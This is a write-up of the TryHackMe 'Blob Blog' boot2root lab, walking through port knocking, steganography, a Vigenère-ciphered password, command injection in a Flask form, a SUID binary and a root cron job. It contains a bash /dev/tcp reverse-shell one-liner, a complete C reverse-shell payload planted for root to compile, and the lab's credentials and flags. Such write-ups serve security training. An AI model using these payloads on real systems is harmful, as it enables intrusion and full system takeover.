# TryHackMe — Blob Blog

**Difficulty:** Medium

> A layered boot2root box: a port-knocking sequence hidden in Brainfuck code, steganography, a Vigenère-ciphered credential, OS command injection in a Flask "review" form, a reverse-engineered SUID binary, and a root cron job race condition.

---

## 🗺️ Attack Path Summary

```
Nmap scan (22, 80 only)
        │
        ▼
HTML comment #1 → Base58 decode → password "cUpC4k3s"
        │
        ▼
HTML comment #2 → Base64 → Brainfuck → "knock houses 1, 3, 5"
        │
        ▼
Port knock (1,3,5/tcp) → unlocks 21 (ftp), 445 (http), 8080 (Flask)
        │
        ▼
FTP as bob / cUpC4k3s → download cool.jpeg
        │
        ▼
Stegseek → passphrase "p@55w0rd" → ciphered creds + path hint
        │
        ▼
/bobs_safe_for_stuff → Vigenère key "youmayenter"
        │
        ▼
Vigenère decode → "bob:d1ff3r3ntP@55w0rd"
        │
        ▼
Gobuster on :8080 → /login, /review
        │
        ▼
Login → OS command injection in review form → reverse shell (www-data)
        │
        ▼
find SUID → custom binary /usr/bin/blogFeedback
        │
        ▼
Reverse-engineer in Ghidra → argument formula 6 5 4 3 2 1
        │
        ▼
Run blogFeedback 6 5 4 3 2 1 → uid 1000 (bobbloblaw) → USER FLAG
        │
        ▼
pspy64 → root cron compiles/runs .boring_file.c every cycle
        │
        ▼
Replace .boring_file.c with reverse-shell C payload
        │
        ▼
nc listener catches root shell on next cron tick → ROOT FLAG
```

---

## 1. Reconnaissance — Initial Nmap Scan

```bash
nmap -sV -sC 10.49.171.8
```

<img width="785" height="323" alt="1" src="https://github.com/user-attachments/assets/cf8228d8-d0be-4c3c-96f1-b978d6613a8b" />


**Results:**
   
|  Port  | Service |                     Version                |
|--------|---------|--------------------------------------------|
| 22/tcp |   ssh   |     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13     |
| 80/tcp |  http   | Apache httpd 2.4.7 (Ubuntu) — default page |

Only two ports visible at first — a strong hint that more services are firewalled behind something (foreshadowing port knocking).

---

## 2. Web Recon — First Hidden Comment

### Apache default page

<img width="920" height="519" alt="2" src="https://github.com/user-attachments/assets/d9150fd7-2f82-4055-85a1-8503e42861c5" />

### Hidden comment #1 — an encoded password

Viewing the page source reveals:

<img width="591" height="131" alt="3" src="https://github.com/user-attachments/assets/cd1e7ab7-c315-4d2c-90f4-330ff05a2b41" />

### Decoding it

```bash
echo 'HcfP8J54AK4' | base58 -d
```

<img width="302" height="58" alt="4" src="https://github.com/user-attachments/assets/74c6f897-1f83-40e3-ba75-78ce834fc38d" />

🔑 **Decoded value:** `cUpC4k3s` — likely a password for the user "Bob."

---

## 3. Web Recon — Second Hidden Comment (Brainfuck)

A second HTML comment contains a long Base64 blob:

<img width="1162" height="65" alt="5" src="https://github.com/user-attachments/assets/66f904dd-03f4-40fa-b5f9-9a4288e56fab" />

### Decoding the Base64

```bash
echo '<base64 blob>' | base64 -d
```

<img width="1260" height="354" alt="6" src="https://github.com/user-attachments/assets/3f7abd5b-1c78-47aa-83ea-c00ab6e97503" />

The decoded output is **Brainfuck** source code (`+-<>[].,` syntax). Running it through a Brainfuck interpreter:

<img width="465" height="86" alt="7" src="https://github.com/user-attachments/assets/1cf3215a-5af2-4449-8c34-1a37a073eca1" />

This is a **port-knocking** hint: knock ports **1, 3, 5** in order.

---

## 4. Port Knocking

```bash
knock -4 10.49.178.250 1:tcp 3:tcp 5:tcp
nmap -sV -sC 10.49.178.250
```

<img width="841" height="536" alt="8" src="https://github.com/user-attachments/assets/9323861d-3916-49b7-9698-b9b68f58326e" />

New ports appear after knocking:

|   Port   | Service |                         Version                      |
|----------|---------|------------------------------------------------------|
|  21/tcp  |   ftp   |                      vsftpd 3.0.2                    |
|  22/tcp  |   ssh   |                     OpenSSH 6.6.1p1                  |
|  80/tcp  |  http   |                   Apache httpd 2.4.7                 |
| 445/tcp  |  http   |                   Apache httpd 2.4.7                 |
| 8080/tcp |  http   | Werkzeug httpd 1.0.1 Python/3.5.3 (Flask dev server) |

---

## 5. FTP Access

```bash
ftp 10.49.178.250
```

Logged in as `bob` with the Base58-decoded password `cUpC4k3s`:

<img width="658" height="274" alt="9" src="https://github.com/user-attachments/assets/1ecf3f5d-ba91-4484-8711-9114662fa1ef" />

```bash
ftp> cd ftp
ftp> cd files
ftp> get cool.jpeg
```

<img width="621" height="339" alt="10" src="https://github.com/user-attachments/assets/3d964990-57f7-45e7-89f7-65cae892609c" />

---

## 6. Steganography

```bash
stegseek cool.jpeg
```

<img width="650" height="293" alt="11" src="https://github.com/user-attachments/assets/cd244e09-bd73-4f48-93ef-dab0e714b44a" />

```
[i] Found passphrase: "p@55w0rd"
[i] Original filename: "out.txt".
```

A credential-shaped string (ciphered) and a URL path.

---

## 7. Following the Path Hint

```
http://10.49.178.250:445/bobs_safe_for_stuff
```

<img width="834" height="138" alt="12" src="https://github.com/user-attachments/assets/de822532-8ea1-4a82-a7da-b11bcac7f510" />

```
Remember this next time bob, you need it to get into the blog!
I'm taking this down tomorrow, so write it down!
- youmayenter
```

The signature **"youmayenter"** looks like a cipher key for the string extracted from the image.

### Vigenère decode

Using `youmayenter` as the key against `zcv:p1fd3v3amT@55n0pr`:

<img width="926" height="148" alt="13" src="https://github.com/user-attachments/assets/6a8c2061-b4d9-49e8-a2a3-1c2fcc9c08e0" />

🔑 **Decoded credential:** `bob:d1ff3r3ntP@55w0rd`

---

## 8. Finding and Accessing the Blog

```bash
gobuster dir -u http://10.49.178.250:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

<img width="921" height="319" alt="14" src="https://github.com/user-attachments/assets/81eb041d-1142-4303-b0d7-733fc5a21df5" />

Found `/login`, `/blog`, and `/review`.

### Logging in

<img width="806" height="242" alt="15" src="https://github.com/user-attachments/assets/012db46a-20f0-4801-91a2-1accc6d94a31" />

Logged in with `bob` / `d1ff3r3ntP@55w0rd`.

---

## 9. OS Command Injection in the Review Form

The `/review` page ("What do you think of my blog? Leave a review") takes free-text input. Testing with a basic command:

<img width="365" height="93" alt="16-1" src="https://github.com/user-attachments/assets/80fa7d03-3ebb-47dd-89ca-0d1e41aca0d3" />

<img width="702" height="145" alt="16-2" src="https://github.com/user-attachments/assets/213b64f8-8d63-4e90-a2ed-5c0af71cf0b2" />

```
app.py  __pycache__  templates
```

The `ls` output is reflected directly — confirming **unauthenticated OS command injection** into the backend Flask app.

### Getting a reverse shell

```bash
bash -i >& /dev/tcp/192.168.137.77/<port> 0>&1
```

<img width="262" height="89" alt="17-1" src="https://github.com/user-attachments/assets/756e576f-c6bd-4cc3-8f58-fb12b7c86e7d" />

```bash
nc -lnvp 4444
```

<img width="704" height="128" alt="17-2" src="https://github.com/user-attachments/assets/94cf99dd-cb21-4c41-8f11-56742b57c1ff" />

```
www-data@bobbloblaw-VirtualBox:~/html2$
```

Foothold achieved as `www-data`.

---

## 10. Discovering a Custom SUID Binary

```bash
find / -perm -4000 2>/dev/null
```

<img width="701" height="531" alt="18" src="https://github.com/user-attachments/assets/06550fda-fdf7-47c4-bad0-a9c3c40db93e" />

Among the standard SUID binaries, one stands out: **`/usr/bin/blogFeedback`** — clearly custom and worth reverse-engineering.

### Exfiltrating the binary

```bash
# on target
python3 -m http.server 4441
```

<img width="623" height="79" alt="19" src="https://github.com/user-attachments/assets/52ab4491-87ab-42bb-bd14-41778e4cdccd" />

```bash
# on attacker machine
wget http://10.49.178.250:4441/blogFeedback
```

<img width="586" height="185" alt="19-2" src="https://github.com/user-attachments/assets/f01f7619-20cd-48c1-b2aa-1a329be38935" />

---

## 11. Reverse Engineering `blogFeedback`

Opened the binary in **Ghidra** to decompile `main()`:

<img width="767" height="506" alt="20" src="https://github.com/user-attachments/assets/6d540e5b-2654-4485-b64e-210fcb7560fe" />

Simplified logic:

```c
int main(int argc, char **argv) {
    if (argc != 7) {
        puts("Order my blogs!");
        return 0;
    }
    for (int i = 1; i < 7; i++) {
        int val = atoi(argv[i]);
        if (val != 7 - i) {
            puts("Hmm... I disagree!");
            return 0;
        }
    }
    puts("Now that, I can get behind!");
    setreuid(1000, 1000);
    system("/bin/sh");
    return 0;
}
```

The program expects **exactly 6 arguments**, each equal to `7 - its position` — i.e. `6 5 4 3 2 1` — then drops to UID **1000** and spawns a shell. Since the binary is **SUID**, this is a path to run a shell as whichever user owns UID 1000.

### Testing locally

<img width="307" height="113" alt="20-2" src="https://github.com/user-attachments/assets/59a7f3ca-f9c7-4595-9116-a5cd510d4e70" />

```
Now that, I can get behind!
```

### Running it on the target

```bash
blogFeedback 6 5 4 3 2 1
id
```

<img width="555" height="89" alt="21" src="https://github.com/user-attachments/assets/a03a0aab-435f-49ef-94c4-d6bba7b1e4e6" />

```
uid=1000(bobbloblaw) gid=33(www-data) groups=33(www-data)
```

Privilege escalated from `www-data` to the **`bobbloblaw`** user.

---

## 12. Capturing the User Flag

<img width="601" height="280" alt="22" src="https://github.com/user-attachments/assets/0200108b-e857-4893-b2b9-142f97b1f043" />

🚩 **User flag:** `THM{C0NGR4t$_g3++ing_this_fur}`

---

## 13. Hunting for Root Privilege Escalation — `pspy64`

```bash
wget http://192.168.137.77:80/pspy64
chmod +x pspy64
./pspy64
```

<img width="679" height="180" alt="23" src="https://github.com/user-attachments/assets/546d5d3e-4ac0-4396-9ca5-ca9d05a02d93" />

Watching running processes revealed a **root cron job** that compiles and executes a C file from the user's own writable directory:

<img width="862" height="63" alt="24" src="https://github.com/user-attachments/assets/953b38a2-9ab4-4143-b027-e70901a5fe49" />

Because `.boring_file.c` lives in a directory **owned by `bobbloblaw`**, and root recompiles + executes it on a schedule, this is a direct privilege escalation path: replace the source file's contents before the next cron tick.

---

## 14. Weaponizing the Cron Job

### Writing a malicious replacement

Edited a local copy of `.boring_file.c` to open a reverse shell back to the attacking machine instead of its original (presumably benign) behavior:

<img width="885" height="475" alt="25" src="https://github.com/user-attachments/assets/274d5af0-7af6-4b39-9920-10443c4eece3" />

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = 5555;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("192.168.137.77");

    connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char *const argv[] = {"bash", NULL};
    execvp("bash", argv);
    return 0;
}
```

### Replacing the file on target

```bash
rm -rf .boring_file.c
```

<img width="678" height="265" alt="26" src="https://github.com/user-attachments/assets/9cb00135-cafd-4fd2-843f-1d6e7b1f9b6b" />

```bash
wget http://192.168.137.77:80/.boring_file.c
```

<img width="851" height="192" alt="27" src="https://github.com/user-attachments/assets/e00956eb-84d0-4c7f-ac2e-2ca53cd7abc5" />

The malicious source now sits exactly where root's cron job expects to find it, waiting for the next compile-and-run cycle.

---

## 15. Catching the Root Shell

```bash
nc -lnvp 5555
```

<img width="589" height="132" alt="28" src="https://github.com/user-attachments/assets/bf82027e-2ccf-432e-8783-8d91398b99a2" />

Root access achieved via the cron job unknowingly compiling and executing the planted reverse shell.

---

## 16. Capturing the Root Flag

<img width="286" height="77" alt="29" src="https://github.com/user-attachments/assets/f888f5b3-da89-468f-8198-007fbd3f21df" />

🚩 **Root flag:** `THM{G00D_J0B_G3++1NG+H3R3!}`


---
